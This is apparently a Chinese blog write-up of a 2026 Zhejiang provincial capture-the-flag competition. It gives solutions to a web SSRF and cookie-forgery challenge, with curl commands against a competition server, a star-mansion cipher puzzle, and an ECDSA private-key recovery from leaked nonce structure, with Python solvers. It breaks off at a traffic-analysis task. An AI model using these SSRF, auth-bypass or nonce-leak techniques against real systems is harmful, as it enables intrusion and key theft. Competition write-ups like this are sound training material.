---
title: 2026年浙江省信息通信业职业技能竞赛(信息安全测试员竞赛) 初赛Wireup
url: https://mp.weixin.qq.com/s/X4-phEwNpQn6u3S89uXp-A
source: Doonsec's feed
date: 2026-08-31
fetch_date: 2026-09-01T06:56:59.995003
---

# 2026年浙江省信息通信业职业技能竞赛(信息安全测试员竞赛) 初赛Wireup

# 2026年浙江省信息通信业职业技能竞赛(信息安全测试员竞赛) 初赛Wireup

赛查查

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

以下文章来源于鱼影安全
，作者落寞的鱼

![](https://wx.qlogo.cn/mmhead/Q3auHgzwzM5oDN9nnkG1ziaib2XoYrq2oQKCtJRc5cIqdzZ12Qne3ssA/0)

**鱼影安全**
.

阿里云博客专家 CSDN博客专家 网络安全领域优质创作者 中高职全国职业技能大赛国赛金牌培训讲师 青年工匠 多次培训出省赛第一名、国赛二等奖，市赛无数等战绩。第七届全国残疾人职业技能大赛 网络安全 赛项 浙江集训教练等。

![图片](https://mmbiz.qpic.cn/mmbiz_gif/iabIwdjuHp2WoekX6fnZ3APEKJwyvmf76EZ0Z309yU3fUicsMz4d7aZ7G41VxQPvKcqmzdqnYwcgWW0V6c8LZBiaQ/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0)

点击上方蓝字·关注我们

**前言：**

***夜班刚好赶巧打比赛，还有些题目忙完在复现！***

***随便记录下大家随便看看就行，最近太忙了！***

---

Web-easy\_js：

某新闻门户网站刚刚上线，听说管理员在开发过程中留下了一些"方便调试"的后门，你能找到并获取Flag吗？

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/qK3m3mOz5ic8ZKP0Iwmv8icDWsQHYUDztCibFaJTCp1m5r9GAdjw6EWpxwmsibRM5LkiaaFsiadypjSMk95AptguydUeaGna5xwsbrgp0T46Xa7y4/640?wx_fmt=png&from=appmsg)

页面中存在反调试、禁用右键、禁用快捷键等前端保护,但这些都只是在浏览器端执行，不影响直接查看HTTP响应和下载JS文件

![](https://mmbiz.qpic.cn/mmbiz_png/qK3m3mOz5icicqTibdYiasw8jxMm019uH9N3spxLug1qFmpmYOdb9dMPq5DQb0diaVXBnXQgN8RxJBpibMiaw3ONpuolI97joZTZMJGnojPntcREXg/640?wx_fmt=png&from=appmsg)

发现文件注释声称使用了 AES-256-CBC + Base64

分析后发现代码逻辑：

1. Base64 解码

2. 使用固定 key 做 XOR

3. `eval` 执行解密后的代码

```
const encrypted = atob(encryptedBase64);const key = 'ctf_secret_key_32_chars_long_123456';
let decrypted = '';for (let i = 0; i < encrypted.length; i++) {  const encryptedChar = encrypted.charCodeAt(i);  const keyChar = key.charCodeAt(i % key.length);  const decryptedChar = encryptedChar ^ keyChar;  decrypted += String.fromCharCode(decryptedChar);}
```

因此可以离线解密 bundle。

```
const fs = require('fs');
const text = fs.readFileSync('main.bundle.js', 'utf8');const key = 'ctf_secret_key_32_chars_long_123456';const match = text.match(/const\s+ENCRYPTED_CODE_[A-Z]+\s*=\s*'([^']+)'/);
const enc = Buffer.from(match[1], 'base64');const out = Buffer.alloc(enc.length);
for (let i = 0; i < enc.length; i++) {  out[i] = enc[i] ^ key.charCodeAt(i % key.length);}
console.log(out.toString('utf8'));```
```

解密结果：

```
{  BASE_URL: "http://localhost:3000",  ENDPOINTS: {    NEWS: "/api/news",    SEARCH: "/api/search",    ADMIN_LOGIN: "/api/admin/login",    INTERNAL_FLAG: "/internal/flag",    SSRF: "/secret_admin_panel_x9k2m8n7/api/fetch"  }}
```

解密 /js/apiConfig.bundle.js后，

题目几乎直接给出了漏洞提示：

```
CHALLENGE_NAME: "News Portal SSRF Challenge"FLAG_LOCATION: "http://localhost:3000/internal/flag"VULNERABILITIES: {  SSRF: {    target: "http://localhost:3000/internal/flag",    method: "POST"  },  WEAK_AUTH: {    bypass_method: "frontend_only_validation"  }}
```

说明目标是通过后台 SSRF 接口访问内网 flag 地址：

```
http://localhost:3000/internal/flag
```

![9cf14a38f354c698f478adba9bee0421.png](https://mmbiz.qpic.cn/mmbiz_png/qK3m3mOz5ic89onBlnG681k5IgR0Lpsia0DCYoe9sJB5YYXnoc4AVghyViauZ1vQibxPKLKIaf5Mhn7ia72jv10W1ZbGr5Lics65Q2q7GibaPSmEWs/640?wx_fmt=png&from=appmsg)

接下来就是绕过：

```
curl -i http://47.103.103.15:28955/secret_admin_panel_x9k2m8n7
```

```
<script src="/js/hiddenLogin.bundle.js"></script>
```

解密 `/js/hiddenLogin.bundle.js` 后，

发现登录成功逻辑完全依赖前端判断后端响应：

```
if (  c.success === true &&  c.message === "登录成功" &&  c.redirect === "/secret_admin_panel_x9k2m8n7") {  document.cookie = "admin_token=...; path=/";  window.location.href = c.redirect;}
```

同时可以看到前端写入的管理员 cookie：

```
admin_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ0aW1lIjoxNzA2MTIzNDU2fQ.fake_signature_admin_2025
```

带上该 cookie 访问后台即可绕过认证：

```
curl -i \  -H "Cookie: admin_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ0aW1lIjoxNzA2MTIzNDU2fQ.fake_signature_admin_2025" \  http://47.103.103.15:28955/secret_admin_panel_x9k2m8n7
```

## SSRF获取Flag 最终利用命令：

```
curl -s -X POST \  -H "Content-Type: application/json" \  -H "Cookie: admin_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ0aW1lIjoxNzA2MTIzNDU2fQ.fake_signature_admin_2025" \  -d '{"url":"http://localhost:3000/internal/flag"}' \  http://47.103.103.15:28955/secret_admin_panel_x9k2m8n7/api/fetch
```

![e915f83b5c629aa8276c8eae2faaa7fe.png](https://mmbiz.qpic.cn/mmbiz_png/qK3m3mOz5ic866qpCGczsxicfQRtKWzTfR4kROqJTaTCg7xrib69PQQIuDia0PcCIicGfNb0oMPLGGQ4x1Aib9svdiaFHur45uyibx47m0ic6e6wZLxs/640?wx_fmt=png&from=appmsg)

---

Misc-hello：

![](https://mmbiz.qpic.cn/mmbiz_png/qK3m3mOz5ic9R13LhqwU0KDFh5o5jKpzhdFFKDHClmE7Z29drQB4oaH66LfVd0GfTQnXZXwdHjBgpnziawDzyvQTlzhGlgH1oW35kyqCXDXJ0/640?wx_fmt=png&from=appmsg)

根据 `note.txt`：

1.二十八宿顺序从东方青龙的角开始。’

2.外圈按逆时针入阵，每象七宿，走完一象再进入下一象。

3.使用后天八卦方位和洛书门数，中宫不入。

后天八卦洛书数：

```
坎北=1，坤西南=2，震东=3，巽东南=4，乾西北=6，兑西=7，艮东北=8，离南=9
```

二十八宿读取顺序：

```
角 亢 氐 房 心 尾 箕斗 牛 女 虚 危 室 壁奎 娄 胃 昴 毕 觜 参井 鬼 柳 星 张 翼 轸
```

从 `maze.png` 读取每个星宿所在卦门，得到分组：

```
震东=3：角 亢 氐 房艮东北=8：心 尾 箕坎北=1：斗 牛 女 虚乾西北=6：危 室 壁兑西=7：奎 娄 胃 昴坤西南=2：毕 觜 参离南=9：井 鬼 柳 星巽东南=4：张 翼 轸
```

最后使用字母表：

```
ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_
```

对每个 `shard` 按所在卦门门数反向位移。

```
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
order = "角亢氐房心尾箕斗牛女虚危室壁奎娄胃昴毕觜参井鬼柳星张翼轸"
shards = {    "胃": "E", "角": "0", "柳": "3", "室": "G", "尾": "2", "觜": "W",    "亢": "X", "奎": "G", "牛": "P", "张": "Q", "房": "Q", "虚": "U",    "鬼": "Q", "昴": "G", "斗": "I", "壁": "T", "箕": "H", "井": "1",    "氐": "D", "女": "V", "星": "I", "毕": "N", "轸": "T", "心": "4",    "参": "Q", "翼": "E", "娄": "9", "危": "O",}
door_num = {}for x in "角亢氐房":    door_num[x] = 3for x in "心尾箕":    door_num[x] = 8for x in "斗牛女虚":    door_num[x] = 1for x in "危室壁":    door_num[x] = 6for x in "奎娄胃昴":    door_num[x] = 7for x in "毕觜参":    door_num[x] = 2for x in "井鬼柳星":    door_num[x] = 9for x in "张翼轸":    door_num[x] = 4
ans = []for mansion in order:    shard = shards[mansion]    shift = door_num[mansion]    idx = alphabet.index(shard)    ans.append(alphabet[(idx - shift) % len(alphabet)])
plain = "".join(ans)print(plain)print(f"flag{{{plain}}}")
```

![image.png](https://mmbiz.qpic.cn/mmbiz_png/qK3m3mOz5icibiaRD3gq1UU2N2QEd6sjicC8x0P2pogTibJV4C9LtpC3sf7FqnkKVib52dBwVeVIqP5ctl7dWicY3wvQ9QHfOfImVzLxoKup3aJcUI/640?wx_fmt=png&from=appmsg)

---

Crypto-ezmath：

一批硬件签名模块的调试日志被导出。日志中每条记录包含一段消息、对应的ECDSA签名，以及两个被工程师称为“校准参数”的数值。厂商认为这些校准参数只是设备运行状态，不会影响私钥安全。

附件给出了曲线名称、公开密钥和三条签名记录。请检查这些记录之间是否存在可以利用的结构，并恢复签名模块的私钥。私钥按大端字节还原后就是本题 flag。

曲线：`secp256k1`

公钥：`pubkey`

3条消息 `msg`

对应 ECDSA 签名 `sig_der`

每条记录的 `alpha\``beta`

ECDSA 签名方程为：

```
s = k^-1 * (z + r*d) mod n
```

`d` 是私钥。

`k` 是签名随机数 nonce

`z = sha256(msg)`

`n` 是 secp256k1 的阶

题目给出的 `alpha`、`beta` 对应一个线性 nonce 泄露模型：

```
k = alpha * seed + beta mod n
```

代入签名方程：

```
s * (alpha * seed + beta) = z + r*d mod n
```

整理为二元一次同余方程：

```
r*d - s*alpha*seed = s*beta - z mod n
```

每条签名记录都能得到一条关于d和seed的线性方程。任意取两条记录，在模n下解二元一次方程组即可恢复私钥d。恢复出的私钥十六进制转字节后就是 flag。

```
import hashlibimport json
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
def parse_der(sig_hex):    b = bytes.fromhex(sig_hex)    assert b[0] == 0x30 and b[2] == 0x02    r_len = b[3]    r = int.from_bytes(b[4:4 + r_len], "big")    pos = 4 + r_len    assert b[pos] == 0x02    s_len = b[pos + 1]    s = int.from_bytes(b[pos + 2:pos + 2 + s_len], "big")    return r, s
def inv(x):    return pow(x % N, -1, N)
def solve_two_linear(e1, e2):    a1, b1, c1 = e1    a2, b2, c2 = e2    det = (a1 * b2 - a2 * b1) % N    d = ((c1 * b2 - c2 * b1) * inv(det)) % N    seed = ((a1 * c2 - a2 * c1) * inv(det)) % N    return d, seed
data = json.load(open("records.json", encoding="utf-8"))
equations = []for rec in data["records"]:    msg = bytes.fromhex(rec["msg"])    z = int.from_bytes(hashlib.sha256(msg).digest(), "big")    r, s = parse_der(rec["sig_der"])    alpha = int(rec["alpha"]) % N    beta = int(rec["beta"]) % N
    # r*d - s*alpha*seed = s*beta - z    equations.append((r % N, (-s * alpha) % N, (s * beta - z) % N))
d, seed = solve_two_linear(equations[0], equations[1])flag = d.to_bytes((d.bit_length() + 7) // 8, "big").decode()print(flag)0x666c61677b3825596466216f3f6a30524a37596565543f79307d
```

转换字节：

```
flag{8%Ydf!o?j0RJ7YeeT?y0}
```

数据安全-流量分析：

给定一份网络流量摘要文件《traffic.csv》。安全...